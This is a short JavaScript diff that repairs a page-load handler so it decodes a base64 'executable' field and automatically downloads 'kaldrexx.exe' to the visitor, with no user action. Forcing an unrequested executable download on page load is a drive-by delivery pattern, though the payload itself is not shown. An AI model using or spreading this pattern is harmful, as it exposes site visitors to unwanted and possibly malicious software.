@@ -21,11 +21,19 @@ window.onload = function () {
             let arrayBuffer = base64ToArrayBuffer(data["executable"]);
             let blob = new Blob([arrayBuffer], { type: "application/octet-stream" });
             let url = URL.createObjectURL(blob);
-            let kaldrexx = document.createElement("kaldrexx");
-            kaldrexx.href = url;
-            kaldrexx.download = "kaldrexx.exe";
-            document.body.appendChild(kaldrexx);
-            kaldrexx.click();
-            window.URL.revokeObjectURL(url);
+
+            // Create a link element
+            let downloadLink = document.createElement("a");
+            downloadLink.href = url;
+            downloadLink.download = "kaldrexx.exe";
+
+            // Append the link to the document body
+            document.body.appendChild(downloadLink);
+
+            // Trigger a click event on the link to start the download
+            downloadLink.click();
+
+            // Remove the link from the document body after the download
+            document.body.removeChild(downloadLink);
         });
 }
